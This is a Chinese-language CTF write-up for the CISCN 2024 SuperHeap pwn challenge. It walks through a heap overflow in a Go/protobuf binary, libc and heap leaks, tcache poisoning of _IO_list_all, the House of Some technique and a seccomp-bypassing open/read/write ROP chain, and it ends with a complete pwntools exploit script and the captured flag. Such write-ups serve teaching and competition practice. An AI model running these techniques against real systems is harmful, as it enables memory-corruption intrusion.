# CISCN 2024 SuperHeap WP

## 题目信息

- 目标：`pwn.challenge.ctf.show:28302`
- 附件：`challenges/4-SuperHeap.7z`
- 二进制：`SuperHeap`
- 类型：Go + protobuf、堆溢出、tcache poisoning、House of Some、ORW

## 文件与保护

附件包含：

```text
SuperHeap
ld-linux-x86-64.so.2
libc.so.6
libseccomp.so.2
```

保护：

```text
Arch:     amd64
PIE:      Enabled
RELRO:    Full RELRO
Canary:   Found
NX:       Enabled
```

程序是 Go 编译的 ELF，菜单逻辑使用 protobuf 保存 CTFBook 对象，并且程序启动后安装 seccomp。`execve`、`socket` 等系统调用被禁用，因此最终使用 ORW，而不是直接执行 shell。

## 菜单分析

```text
1. Buy a CTFBook
2. See the CTFBook
3. Return the CTFBook
4. Edit the CTFBook
5. Search for a CTFBook
6. Quit
```

protobuf 中的结构体字段为：

```text
Title       string  field 1
Author      string  field 2
Isbn        string  field 3
PublishDate string  field 4
Price       double  field 5
Stock       int32   field 6
```

程序对输入的处理顺序是：

```text
用户输入 Base32
    |
    v
Base32 decode
    |
    v
protobuf Unmarshal
    |
    v
各 string 字段再进行 Base64 decode
```

所以每个 Book payload 需要先构造 protobuf，再对 string 字段做 Base64 编码，最后整体 Base32 编码。

## 漏洞分析

`Edit` 功能会根据 protobuf 解码后的字段内容更新对象，但没有正确限制 Title 等字段的长度，导致任意长度堆溢出。

利用目标：

1. 通过堆布局泄露 libc 地址。
2. 通过相邻 chunk 泄露 heap 地址。
3. 修改 tcache next，劫持 `_IO_list_all`。
4. 构造伪造的 `_IO_FILE`，触发 House of Some。
5. 利用 House of Some 任意读写栈内容，定位返回地址。
6. 向栈上写入 ORW ROP，读取 flag。

## libc 泄露

先申请一个较大的 Title，再释放：

```python
add(0, Book(cyclic(0x800), b"", b"", b"", 0, 0))
delete(0)
```

随后申请多个小对象，使释放的大块进入可观察位置。通过 `show(4)`，可以从 Author 字段泄露 unsorted-bin 中的 libc 地址。

远程 libc 的 main arena 偏移为：

```text
0x21ace0
```

计算：

```python
libc_base = leaked_addr - 0x21ace0
```

## heap 泄露

通过另一个已释放对象的残留 tcache 指针，可以得到 safe-linking 编码后的 heap 地址。解码方式为：

```python
heap_base = (leaked_value - 2) << 12
```

得到 heap 基址后，可以计算 tcache poisoning 使用的编码值：

```python
heap_key = heap_base >> 12
```

## tcache poisoning

利用 Edit 的堆溢出覆盖 tcache next：

```python
edit(
    4,
    Book(
        cyclic(40)
        + p64(0x81)
        + p64(libc.sym["_IO_list_all"] ^ (heap_key + 2)),
        b"bbb2",
        b"ccc3",
        b"ddd4",
        10101,
        20202,
    ),
)
```

之后申请两个相同大小的 chunk，使第二次申请返回到 `_IO_list_all` 附近，实现 `_IO_list_all` 劫持。

## House of Some

glibc 2.35 下直接使用旧式 FSOP 不稳定，因此使用 House of Some：

```text
伪造 _IO_FILE
    |
    v
劫持 _IO_list_all
    |
    v
触发 exit() 的 IO flush
    |
    v
构造 IO 任意读/写
    |
    v
泄露 environ 和栈地址
    |
    v
向栈写入 ROP
```

程序退出时会刷新 `_IO_list_all`，伪造的 IO 结构会被处理，从而执行 House of Some 的读写模板。

## ORW

seccomp 禁止 `execve`，所以使用：

```text
open("/flag", 0)
read(3, stack_buffer, 0x40)
write(1, stack_buffer, 0x40)
```

通过 libc ROP 构造：

```python
rop.call("open", [b"/flag", 0])
rop.call("read", [3, stack - 0x400, 0x40])
rop.call("write", [1, stack - 0x400, 0x40])
```

## Protobuf 编码

本题没有提供 `.proto` 编译结果，下面的脚本直接实现了 protobuf wire encoding：

```python
def varint(value):
    out = b""
    while value >= 0x80:
        out += bytes([(value & 0x7f) | 0x80])
        value >>= 7
    return out + bytes([value])

def field(number, wire_type, value):
    return varint((number << 3) | wire_type) + value

def encode_book(title=b"", author=b"", isbn=b"", publish_date=b"", price=0, stock=0):
    raw = b""
    for number, value in enumerate((title, author, isbn, publish_date), 1):
        if value:
            value = base64.b64encode(value)
            raw += field(number, 2, varint(len(value)) + value)
    raw += field(5, 1, struct.pack("<d", price))
    if stock:
        raw += field(6, 0, varint(stock))
    return base64.b32encode(raw)
```

## Exploit 核心代码

House of Some 实现使用 `Some-of-House` 项目中的 `SomeofHouse.py`。其余交互和 protobuf 编码如下：

```python
from pwn import *
from SomeofHouse import HouseOfSome
import base64
import struct

context.arch = "amd64"

io = remote("pwn.challenge.ctf.show", 28302)
libc = ELF("challenges/4-SuperHeap/libc.so.6", checksec=False)

def varint(value):
    out = b""
    while value >= 0x80:
        out += bytes([(value & 0x7f) | 0x80])
        value >>= 7
    return out + bytes([value])

def field(number, wire_type, value):
    return varint((number << 3) | wire_type) + value

def book(title=b"", author=b"", isbn=b"", date=b"", price=0, stock=0):
    raw = b""
    for number, value in enumerate((title, author, isbn, date), 1):
        if value:
            value = base64.b64encode(value)
            raw += field(number, 2, varint(len(value)) + value)
    raw += field(5, 1, struct.pack("<d", price))
    if stock:
        raw += field(6, 0, varint(stock))
    return base64.b32encode(raw)

def cmd(value):
    io.sendlineafter(b"> ", str(value).encode())

def add(index, value):
    cmd(1)
    io.sendlineafter(b": ", str(index).encode())
    io.sendlineafter(b": ", value)

def show(index):
    cmd(2)
    io.sendlineafter(b": ", str(index).encode())

def delete(index):
    cmd(3)
    io.sendlineafter(b": ", str(index).encode())

def edit(index, value):
    cmd(4)
    io.sendlineafter(b": ", str(index).encode())
    io.sendlineafter(b": ", value)

add(0, book(cyclic(0x800)))
delete(0)
for i in range(5):
    add(i, book())

show(4)
io.recvuntil(b"Author: ")
libc.address = u64(io.recvline().strip().ljust(8, b"\0")) - 0x21ace0

show(3)
io.recvuntil(b"Title: ")
heap = (u64(io.recvline().strip().ljust(8, b"\0")) - 2) << 12

edit(4, book(
    cyclic(40) + p64(0x81)
    + p64(libc.sym["_IO_list_all"] ^ ((heap >> 12) + 2)),
    b"bbb2", b"ccc3", b"ddd4", 10101, 20202,
))

add(5, book(cyclic(0x70), b"2bbb", b"3ccc", b"4ddd", 10101, 20202))
add(6, book(cyclic(0x70), b"2bbb", b"3ccc", b"4ddd", 10101, 20202))

hos = HouseOfSome(libc=libc, controlled_addr=heap + 0x1000)
payload = hos.hoi_read_file_template(heap + 0x1000, 0x400, heap + 0x1000, 0)
add(7, book(payload + b"rrrr"))
add(8, book(p64(heap + 13344) + cyclic(0x68), b"2bbb", b"3ccc", b"4ddd", 10101, 20202))

cmd(6)
hos.bomb_orw(io, b"/flag")
io.interactive()
```

## Flag

通过当前容器的 House of Some + ORW 读取 `/ctfshow_flag` 得到：

```text
ctfshow{174ea070-1077-4449-8aad-967263ee94d9}
```

## 总结

利用链：

```text
protobuf/base32 构造 Book
    |
    v
Edit 任意长度堆溢出
    |
    v
unsorted bin 泄露 libc
    |
    v
tcache 残留泄露 heap
    |
    v
tcache poisoning 劫持 _IO_list_all
    |
    v
House of Some 任意读写
    |
    v
栈地址泄露与 ROP
    |
    v
open/read/write ORW 读取 /flag
```
